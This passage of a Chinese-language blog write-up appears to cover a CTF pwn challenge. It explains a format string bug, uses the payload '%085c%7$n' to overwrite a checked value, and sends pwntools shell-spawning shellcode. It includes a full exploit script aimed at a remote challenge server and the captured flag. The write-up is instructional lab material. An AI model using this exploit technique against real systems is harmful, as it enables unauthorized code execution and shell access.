-<p><img src="https://i.loli.net/2020/05/08/DzEihSeIblU8uFA.png" alt="17627983-6cdde7e8a076f299.png"></p>
-<p><code>printf(&amp;format, &amp;format);</code></p>
-<p>通过此处可修改v4[0]值，现在需要确定v4[0]地址。在main()函数中，打印的secret[0]正是v5,即v4[0]地址。</p>
-<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>通过格式化字符串漏洞赋值a1为85，使if条件成真，执行我们传入的shellcode拿到shell。</p>
-<blockquote>
-<p>函数调用约定：linux_x64下，参数从左到右放入寄存器：RDI,RSI,RDX,ECX,R8,R9,当参数为7个以上时，前面6个与前面一样，但后面的以此从“右向左”放入栈中。</p>
-</blockquote>
-<blockquote>
-<p>利用pwntools自带的shellcodecraft工具，生成amd64架构下的shellcode，拿到shell.</p>
-</blockquote>
-<blockquote>
-<p>Pwntools  shellcraft模块：是shellcode的模块，包含一些生成shellcode的函数，子模块声明架构（如：shellcode.arm是ARm架构；shellcraft.amd64是AMD64架构；shellcraft.common是所有架构通用）</p>
-</blockquote>
-<p><code>printf(shellcraft.sh())  #打印出shellcode</code><br><code>printf(asm(shellcraft.sh()))  #打印出汇编后的shellcode</code></p>
-<p>用gdb调试程序，在printf下断点，输入%x测试，发现输出如图：</p>
-<p><img src="https://i.loli.net/2020/05/08/pYcXRjQuOKesnf6.png" alt="17627983-fe71239050c56166.png"></p>
-<p>填写address时我输入的是56（0x38），也就是[rsp+16]的位置，即格式化字符串的第7个参数（printf的第8个参数）</p>
-<blockquote>
-<p>conext.log_level=”debug”  脚本在执行时输出debug的信息，可以通过观察这些信息查找哪步出错</p>
-</blockquote>
-<p>补：<br>之前不知道sh.recv(7),16是什么意思，现在补充，就是sendline自带换行符，所以要把\n过滤掉，7是因为v3就是打印的6个书，换行符是第7位，16代表十六进制。</p>
-<p><img src="https://i.loli.net/2020/05/08/b82ZR5pS9hPd4FK.png" alt="17627983-56395b2513720994.png"></p>
-<p>exp：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"> #sh&#x3D;process(&#39;.&#x2F;string&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;111.198.29.45&#39;,36129)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">sh.recvuntil(&#39;secret[0] is&#39;)</span><br><span class="line">v3_addr&#x3D;int(sh.recv(7),16)</span><br><span class="line">sh.recvuntil(&#39;name be:&#39;)</span><br><span class="line">sh.sendline(&#39;zzz&#39;)</span><br><span class="line">sh.recvuntil(&#39;east or up?:&#39;)</span><br><span class="line">sh.sendline(&#39;east&#39;)</span><br><span class="line">sh.recvuntil(&#39;leave(0)?:&#39;)</span><br><span class="line">sh.sendline(&#39;1&#39;)</span><br><span class="line">sh.recvuntil(&#39;\&#39;Give me an address\&#39;&#39;)</span><br><span class="line">sh.sendline(str(v3_addr))</span><br><span class="line">sh.recvuntil(&#39;you wish is:&#39;)</span><br><span class="line">payload&#x3D;&#39;%085c&#39;+&#39;%7$n&#39;</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(&#39;I will help you! USE YOU SPELL&#39;)</span><br><span class="line">sh.sendline(asm(shellcraft.amd64.linux.sh(),arch&#x3D;&quot;amd64&quot;))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-
-<p>cyberpeace{962a040a22938025e2ad4bbe3e5b56d3}</p>
-
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
     </div>
 
       
